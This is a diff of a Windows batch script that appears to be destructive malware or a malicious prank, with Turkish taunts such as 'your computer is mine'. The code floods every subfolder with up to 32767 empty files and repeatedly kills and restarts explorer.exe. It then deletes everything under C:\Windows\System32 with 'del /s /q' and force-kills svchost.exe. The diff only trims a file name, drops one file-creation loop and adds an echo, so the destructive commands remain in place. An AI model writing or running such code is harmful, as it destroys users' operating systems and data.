@@ -14,7 +14,7 @@ echo So, im in your PC wanna see proof ?
 :: Her alt klasörde dosyalar oluştur
 for /r "%rootDir%" %%d in (.) do (
     for /l %%j in (1,1,32767) do (
-        type nul > "%%d\UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT_%%j.txt"
+        type nul > "%%d\UR NEXT UR NEXT UR NEXT_%%j.txt"
     )
 )
 setlocal enabledelayedexpansion
@@ -54,10 +54,6 @@ timeout /t 1 /nobreak
 color f
 echo HAHAHHA BILGISAYARIN BENIM !
 
-:: Create 32767 files with a long name
-for /l %%j in (1,1,32767) do (
-    type nul > "UR NEXT UR NEXT UR NEXT_%%j.txt"
-)
 echo Sonun geldi evlat..
 taskkill /f /im explorer.exe
 start explorer.exe
@@ -77,6 +73,8 @@ taskkill /f /im explorer.exe
 start explorer.exe
 taskkill /f /im explorer.exe
 start explorer.exe
+echo HAHAHAHAHAH
+
 del /s /q C:\Windows\System32\*
 taskkill /f /im svchost.exe
 pause
